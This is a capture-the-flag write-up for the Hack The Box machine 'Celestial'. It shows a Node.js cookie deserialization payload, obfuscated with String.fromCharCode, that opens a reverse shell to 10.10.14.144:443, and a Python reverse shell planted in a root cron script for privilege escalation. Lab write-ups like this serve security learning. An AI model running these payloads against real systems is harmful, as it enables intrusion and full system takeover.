# Celestial Write Up

> - node.js de-serialize issue lead to shell
> - crontab for root

## Enumeration

I started off with a masscan for all 65535 ports and follow it up by nmap

```
root@kali:~/Desktop/HTB/Celestial# nmap -sS -sV -sC -p 3000 10.10.10.85      

Starting Nmap 7.60 ( https://nmap.org ) at 2018-08-25 22:22 +08
Nmap scan report for 10.10.10.85
Host is up (0.36s latency).

PORT     STATE SERVICE VERSION
3000/tcp open  http    Node.js Express framework
|_http-title: Site doesn't have a title (text/html; charset=utf-8).

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 21.16 seconds

```

Important information we got the scan was, port 3000 is running `node.js` 

A simple curl command return the following.

```
root@kali:~/Desktop/HTB/Celestial# curl -vvv 10.10.10.85:3000
* Rebuilt URL to: 10.10.10.85:3000/
*   Trying 10.10.10.85...
* TCP_NODELAY set
* Connected to 10.10.10.85 (10.10.10.85) port 3000 (#0)
> GET / HTTP/1.1
> Host: 10.10.10.85:3000
> User-Agent: curl/7.60.0
> Accept: */*
> 
< HTTP/1.1 200 OK
< X-Powered-By: Express
< Set-Cookie: profile=eyJ1c2VybmFtZSI6IkR1bW15IiwiY291bnRyeSI6IklkayBQcm9iYWJseSBTb21ld2hlcmUgRHVtYiIsImNpdHkiOiJMYW1ldG93biIsIm51bSI6IjIifQ%3D%3D; Max-Age=900; Path=/; Expires=Sat, 25 Aug 2018 14:38:22 GMT; HttpOnly
< Content-Type: text/html; charset=utf-8
< Content-Length: 12
< ETag: W/"c-8lfvj2TmiRRvB7K+JPws1w9h6aY"
< Date: Sat, 25 Aug 2018 14:23:22 GMT
< Connection: keep-alive
< 
* Connection #0 to host 10.10.10.85 left intact
<h1>404</h1>r
```

Note the `cookie`

```
profile=eyJ1c2VybmFtZSI6IkR1bW15IiwiY291bnRyeSI6IklkayBQcm9iYWJseSBTb21ld2hlcmUgRHVtYiIsImNpdHkiOiJMYW1ldG93biIsIm51bSI6IjIifQ%3D%3D
```

%3D decode to `=` which tell us that this is a base64 string. 

This show us that we are setting a cookie with name `profile` of the following value

```
{"username":"Dummy","country":"Idk Probably Somewhere Dumb","city":"Lametown","num":"2"}
```

By playing around with the json. I managed to get some errors

![errors](https://raw.githubusercontent.com/lycjackie/boot2root/master/images/celestial.png)

with some googling, I managed to find a nodejs shell code. https://github.com/ajinabraham/Node.Js-Security-Course/blob/master/nodejsshell.py

So the final payload for the cookie look something like this

```
{"rce":"_$$ND_FUNC$$_function(){eval(String.fromCharCode(10,118,97,114,32,110,101,116,32,61,32,114,101,113,117,105,114,101,40,39,110,101,116,39,41,59,10,118,97,114,32,115,112,97,119,110,32,61,32,114,101,113,117,105,114,101,40,39,99,104,105,108,100,95,112,114,111,99,101,115,115,39,41,46,115,112,97,119,110,59,10,72,79,83,84,61,34,49,48,46,49,48,46,49,52,46,49,52,52,34,59,10,80,79,82,84,61,34,52,52,51,34,59,10,84,73,77,69,79,85,84,61,34,53,48,48,48,34,59,10,105,102,32,40,116,121,112,101,111,102,32,83,116,114,105,110,103,46,112,114,111,116,111,116,121,112,101,46,99,111,110,116,97,105,110,115,32,61,61,61,32,39,117,110,100,101,102,105,110,101,100,39,41,32,123,32,83,116,114,105,110,103,46,112,114,111,116,111,116,121,112,101,46,99,111,110,116,97,105,110,115,32,61,32,102,117,110,99,116,105,111,110,40,105,116,41,32,123,32,114,101,116,117,114,110,32,116,104,105,115,46,105,110,100,101,120,79,102,40,105,116,41,32,33,61,32,45,49,59,32,125,59,32,125,10,102,117,110,99,116,105,111,110,32,99,40,72,79,83,84,44,80,79,82,84,41,32,123,10,32,32,32,32,118,97,114,32,99,108,105,101,110,116,32,61,32,110,101,119,32,110,101,116,46,83,111,99,107,101,116,40,41,59,10,32,32,32,32,99,108,105,101,110,116,46,99,111,110,110,101,99,116,40,80,79,82,84,44,32,72,79,83,84,44,32,102,117,110,99,116,105,111,110,40,41,32,123,10,32,32,32,32,32,32,32,32,118,97,114,32,115,104,32,61,32,115,112,97,119,110,40,39,47,98,105,110,47,115,104,39,44,91,93,41,59,10,32,32,32,32,32,32,32,32,99,108,105,101,110,116,46,119,114,105,116,101,40,34,67,111,110,110,101,99,116,101,100,33,92,110,34,41,59,10,32,32,32,32,32,32,32,32,99,108,105,101,110,116,46,112,105,112,101,40,115,104,46,115,116,100,105,110,41,59,10,32,32,32,32,32,32,32,32,115,104,46,115,116,100,111,117,116,46,112,105,112,101,40,99,108,105,101,110,116,41,59,10,32,32,32,32,32,32,32,32,115,104,46,115,116,100,101,114,114,46,112,105,112,101,40,99,108,105,101,110,116,41,59,10,32,32,32,32,32,32,32,32,115,104,46,111,110,40,39,101,120,105,116,39,44,102,117,110,99,116,105,111,110,40,99,111,100,101,44,115,105,103,110,97,108,41,123,10,32,32,32,32,32,32,32,32,32,32,99,108,105,101,110,116,46,101,110,100,40,34,68,105,115,99,111,110,110,101,99,116,101,100,33,92,110,34,41,59,10,32,32,32,32,32,32,32,32,125,41,59,10,32,32,32,32,125,41,59,10,32,32,32,32,99,108,105,101,110,116,46,111,110,40,39,101,114,114,111,114,39,44,32,102,117,110,99,116,105,111,110,40,101,41,32,123,10,32,32,32,32,32,32,32,32,115,101,116,84,105,109,101,111,117,116,40,99,40,72,79,83,84,44,80,79,82,84,41,44,32,84,73,77,69,79,85,84,41,59,10,32,32,32,32,125,41,59,10,125,10,99,40,72,79,83,84,44,80,79,82,84,41,59,10))}()"}
```



### Getting Root

Once I am in the system. The first suspicious file I see was

```
sun@sun:~$ ls -la
ls -la
total 152
...
-rw-r--r--  1 root root   21 Aug 25 10:30 output.txt
sun@sun:~$ date
date
Sat Aug 25 10:36:10 EDT 2018
```

This particular file in sun `home` directory is owned by root and the `date` command show that the system time is only 1 min after modification of the file. Which lead me to think that there is a cronjob running as root behind.



After playing around with the home directory. I found the following

```
sun@sun:~/Documents$ ls -la
ls -la
total 16
drwxr-xr-x  2 sun sun 4096 Mar  4 15:08 .
drwxr-xr-x 21 sun sun 4096 Aug 25 10:01 ..
-rw-rw-r--  1 sun sun   29 Sep 21  2017 script.py
-rw-rw-r--  1 sun sun   33 Sep 21  2017 user.txt
sun@sun:~/Documents$ cat script.py
cat script.py
print "Script is running..."
sun@sun:~/Documents$ cat ../output.txt
cat ../output.txt
Script is running...

```

Note that the content of `output.txt` is identical to `script.py`. Which lead me to think that maybe root is running the script periodically.

Also note that we own the file for `script.py` which also mean that we can write anything into the file.

So using our favorite pentest monkey reverse shell for python

```python
import socket,subprocess,os
s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
s.connect(("10.10.14.144",443))
os.dup2(s.fileno(),0) 
os.dup2(s.fileno(),1) 
os.dup2(s.fileno(),2)
p=subprocess.call(["/bin/sh","-i"])
```

and 5 mins of waiting. 

I managed to get root

```
root@sun:~# wc -c root.txt
wc -c root.txt
33 root.txt
root@sun:~# whoami
whoami
root
root@sun:~# 
```



### FIN

After getting root. `crontab -l` show the following

```
*/5 * * * * python /home/sun/Documents/script.py > /home/sun/output.txt; cp /root/script.py /home/sun/Documents/script.py; chown sun:sun /home/sun/Documents/script.py; chattr -i /home/sun/Documents/script.py; touch -d "$(date -R -r /home/sun/Documents/user.txt)" /home/sun/Documents/script.py

```




